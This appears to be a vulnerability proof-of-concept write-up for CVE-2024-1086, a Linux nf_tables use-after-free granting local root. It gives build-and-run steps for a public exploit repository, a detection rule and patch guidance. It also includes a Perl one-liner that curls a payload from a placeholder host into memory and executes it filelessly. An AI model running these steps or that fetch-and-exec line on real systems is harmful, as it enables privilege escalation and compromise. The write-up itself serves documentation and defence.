@@ -1,0 +1,180 @@
+
+<!-- 
+  File: 2026-05-17_linux-nftables-uaf-lpe.md
+  Location: pocs/binary/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2024-03-25 |
+| **Author / Researcher** | Notselwyn |
+| **CVE / Advisory** | CVE-2024-1086 |
+| **Category** | binary |
+| **Severity** | High |
+| **CVSS Score** | 7.8 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | LPE, UAF, Linux kernel, nf_tables, netfilter, CISA KEV, ransomware, x64 |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Linux kernel (netfilter nf_tables subsystem) |
+| **Versions Affected** | v5.14 to v6.6 (excluding patched branches: v5.15.149+, v6.1.76+, v6.6.15+) |
+| **Language / Platform** | C, Linux x64/amd64 |
+| **Authentication Required** | No (unprivileged local user with user namespaces enabled) |
+| **Network Access Required** | No (local only) |
+
+---
+
+## Summary
+
+CVE-2024-1086 is a use-after-free vulnerability in the Linux kernel's netfilter nf_tables subsystem that allows an unprivileged local user to escalate privileges to root. The exploit achieves a 99.4% success rate on KernelCTF images and works universally across Debian, Ubuntu, and KernelCTF kernels between v5.14 and v6.6. It has been actively weaponized by ransomware groups RansomHub and Akira and is listed on the CISA Known Exploited Vulnerabilities (KEV) catalog. The only prerequisites are user namespaces and nf_tables being enabled (the default on most major distributions).
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+A use-after-free condition exists in the nf_tables component of the Linux kernel's netfilter subsystem. When nf_tables expressions are evaluated, an object can be freed while still being referenced by another kernel structure, allowing an attacker to reclaim the freed memory with attacker-controlled data and subsequently gain arbitrary kernel read/write primitives. The underlying bug is present in all kernel versions from v3.15 to v6.8-rc1.
+
+### Attack Vector
+
+An unprivileged local user with access to user namespaces (`CONFIG_USER_NS=y`, `sysctl kernel.unprivileged_userns_clone=1`) and nf_tables (`CONFIG_NF_TABLES=y`) crafts a sequence of nf_tables operations to trigger the UAF condition. Both these kernel features are enabled by default on Debian, Ubuntu, and KernelCTF. No network access or elevated privileges are required to trigger the vulnerability.
+
+### Impact
+
+Full local privilege escalation to root (uid=0). An attacker can obtain a root shell, achieve persistence through disk writes, and fully compromise the host. Note: the exploit deliberately causes a kernel panic after the root shell is obtained (as a research mitigation to discourage malicious use), but the root shell is functional before the panic and disk persistence is possible. The exploit does not work on kernels v6.4+ with `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (e.g., Ubuntu v6.5).
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Debian 12 / Ubuntu 22.04 LTS / KernelCTF
+Kernel:      v5.14 – v6.6 (excl. patched stable branches)
+Architecture: x64/amd64
+Attacker:    Local unprivileged shell on target
+Tools:       gcc, make, libmnl, libnftnl (bundled in repo)
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/Notselwyn/CVE-2024-1086
+cd CVE-2024-1086
+make
+./exploit
+```
+
+Alternatively, use the precompiled x64 binary from the releases page if building is impractical.
+
+Fileless execution (requires Perl on target):
+```bash
+perl -e '
+  require qw/syscall.ph/;
+  my $fd = syscall(SYS_memfd_create(), $fn, 0);
+  system "curl https://example.com/exploit -s >&$fd";
+  exec {"/proc/$$/fd/$fd"} "memfd";
+'
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Build the exploit** — Clone repo and compile with make
+   ```bash
+   git clone https://github.com/Notselwyn/CVE-2024-1086
+   cd CVE-2024-1086
+   make
+   ```
+
+2. **Optional: Adjust configuration** — Edit `src/config.h` for non-default setups (e.g., systems with >32 GiB RAM, SSH sessions)
+   ```bash
+   # Set CONFIG_REDIRECT_LOG=1 if running over SSH or reverse shell
+   # Increase CONFIG_PHYS_MEM if target has more than 32GiB RAM
+   ```
+
+3. **Run the exploit** — Execute as an unprivileged user
+   ```bash
+   ./exploit
+   ```
+
+### Exploit Code
+
+> See `src/main.c`, `src/nftnl.c`, `src/env.c`, `src/file.c`, `src/net.c` in this folder.
+
+```bash
+make && ./exploit
+```
+
+### Expected Output
+
+```
+root
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## Screenshots / Evidence
+
+<!-- No screenshots bundled; see upstream repo for video demo -->
+- Upstream video demo: https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+kernel BUG at net/netfilter/nf_tables_api.c
+use-after-free write in nft_expr_destroy
+
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert any any -> any any (msg:"CVE-2024-1086 nf_tables UAF LPE attempt"; \
+  content:"CLONE_NEWUSER"; content:"nf_tables"; sid:9000086;)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade to kernel v5.15.149+, v6.1.76+, v6.6.15+, or v6.7+ |
+| **Workaround** | Disable unprivileged user namespaces: `sysctl -w kernel.unprivileged_userns_clone=0` |
+| **Config Hardening** | Set `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` on v6.4+ kernels; restrict nf_tables with seccomp/AppArmor |
+
+---
+
+## References
+
+- [CVE-2024-1086 NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-1086)
+- [GitHub Repository - Notselwyn/CVE-2024-1086](https://github.com/Notselwyn/CVE-2024-1086)
+- [Flipping Pages - Full Write-up (pwning.tech)](https://pwning.tech/nftables)
+- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+- [Kernel Patch (v6.6.15)](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?h=linux-6.6.y)
+
+---
+
+## Notes
+
+The exploit intentionally causes a kernel panic after execution as a deterrent against malicious use — the root shell is granted before the panic, making it still valid as a PoC in lab environments. Disk persistence is achievable from within the root shell before the panic. Stability may degrade significantly on systems with active network adapters (especially WiFi); disabling WiFi adapters via BIOS is recommended on test devices. RansomHub and Akira ransomware groups have been observed using this vulnerability in the wild.
+
+Auto-ingested from https://github.com/Notselwyn/CVE-2024-1086 on 2026-05-17.
+
